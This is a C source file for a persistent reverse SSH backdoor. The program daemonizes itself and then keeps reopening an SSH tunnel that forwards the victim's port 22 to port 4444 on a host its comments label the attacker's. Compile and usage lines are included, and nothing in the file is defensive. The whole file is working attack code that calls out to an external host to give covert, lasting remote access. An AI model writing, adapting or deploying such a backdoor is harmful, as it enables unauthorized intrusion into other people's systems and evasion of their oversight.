// reverse_ssh_persistent.c
// Compile: gcc reverse_ssh_persistent.c -o revssh
// Usage: ./revssh

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

#define ATTACKER_USER "lbonilla"
#define ATTACKER_HOST "192.168.1.66"  // <-- Replace with VPS or public server
#define REMOTE_PORT "4444"               // <-- Port on attacker machine
#define LOCAL_PORT "22"                  // <-- SSH port on victim
#define SSH_BIN "/usr/bin/ssh"

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) {
        fprintf(stderr, "[DEBUG] First fork failed\n");
        exit(1);
    }
    if (pid > 0) {
        fprintf(stderr, "[DEBUG] Parent exiting after first fork\n");
        exit(0); // parent exits
    }

    if (setsid() < 0) {
        fprintf(stderr, "[DEBUG] setsid() failed\n");
        exit(1);
    } else {
        fprintf(stderr, "[DEBUG] New session created\n");
    }

    pid = fork();
    if (pid < 0) {
        fprintf(stderr, "[DEBUG] Second fork failed\n");
        exit(1);
    }
    if (pid > 0) {
        fprintf(stderr, "[DEBUG] Session leader exiting after second fork\n");
        exit(0); // session leader exits
    }

    umask(0);
    chdir("/");

    for (int i = sysconf(_SC_OPEN_MAX); i>=0; i--) close(i);

    fprintf(stderr, "[DEBUG] Daemonization complete\n");
}

int main() {
    fprintf(stderr, "[DEBUG] Starting reverse SSH persistent daemon\n");
    daemonize();

    while (1) {
        pid_t pid = fork();

        if (pid == 0) {
            fprintf(stderr, "[DEBUG] Child process: attempting to exec SSH tunnel\n");
            execl(SSH_BIN, "ssh", "-N", "-R",
                  REMOTE_PORT ":localhost:" LOCAL_PORT,
                  ATTACKER_USER "@" ATTACKER_HOST, (char *)NULL);
            fprintf(stderr, "[DEBUG] execl failed\n");
            exit(1); // if exec fails
        } else if (pid > 0) {
            fprintf(stderr, "[DEBUG] Parent process: waiting for child (SSH tunnel) to exit\n");
            waitpid(pid, NULL, 0);
            fprintf(stderr, "[DEBUG] Child exited, sleeping 10 seconds before retry\n");
            sleep(10); // retry every 10s if connection drops
        } else {
            fprintf(stderr, "[DEBUG] fork() failed in main loop, sleeping 10 seconds\n");
            sleep(10);
        }
    }

    return 0;
}
